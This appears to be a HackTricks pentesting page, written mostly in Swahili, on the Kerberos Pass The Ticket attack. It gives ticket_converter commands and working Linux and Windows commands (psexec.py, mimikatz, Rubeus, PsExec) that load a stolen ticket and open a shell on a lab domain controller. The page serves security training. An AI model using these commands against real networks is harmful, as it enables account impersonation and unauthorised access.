# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Pass The Ticket (PTT)

Katika mbinu ya shambulio ya **Pass The Ticket (PTT)**, washambuliaji **hupora tiketi ya uthibitishaji ya mtumiaji** badala ya nenosiri au thamani za hash. Tiketi hii iliyoporwa inatumika **kufanana na mtumiaji**, ikipata ufikiaji usioidhinishwa kwa rasilimali na huduma ndani ya mtandao.

**Soma**:

- [Harvesting tickets from Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Harvesting tickets from Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

### **Swaping Linux and Windows tickets between platforms**

Zana ya [**ticket_converter**](https://github.com/Zer1t0/ticket_converter) inabadilisha muundo wa tiketi kwa kutumia tiketi yenyewe na faili ya matokeo.
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache => kirbi

python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
```
Katika Windows [Kekeo](https://github.com/gentilkiwi/kekeo) inaweza kutumika.

### Shambulio la Pass The Ticket
```bash:Linux
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

```bash:Windows
#Load the ticket in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
klist #List tickets in cache to cehck that mimikatz has loaded the ticket
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
## Marejeleo

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#include ../../banners/hacktricks-training.md}}
